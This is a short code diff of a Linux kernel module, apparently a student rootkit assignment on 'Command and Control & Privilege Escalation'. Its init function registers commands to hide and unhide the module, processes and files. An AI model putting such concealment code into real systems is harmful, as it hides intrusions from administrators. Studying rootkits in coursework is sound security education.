@@ -11,16 +11,18 @@
 #include "sysmap.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 6 - Socket Hiding"
+#define DRIVER_DESC   "Assigment 7 - Command and Control & Privilege Escalation"
 
 static int __init mod_init(void)
 {
   listen();
   hide_processes();
-  add_command("hide", NOARG, hide_code);
-  add_command("unhide", NOARG, unhide_code);
-  add_command("intlist", INTLST, NULL);
+  add_command("hideme", NOARG, hide_code);
+  add_command("unhideme", NOARG, unhide_code);
   add_command("hidepid", INTARG, hide_process);
+  add_command("unhidepc", NOARG, unhide_processes);
+  add_command("hidefile", NOARG, hide_files);
+  add_command("unhidef", NOARG, unhide_files);
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
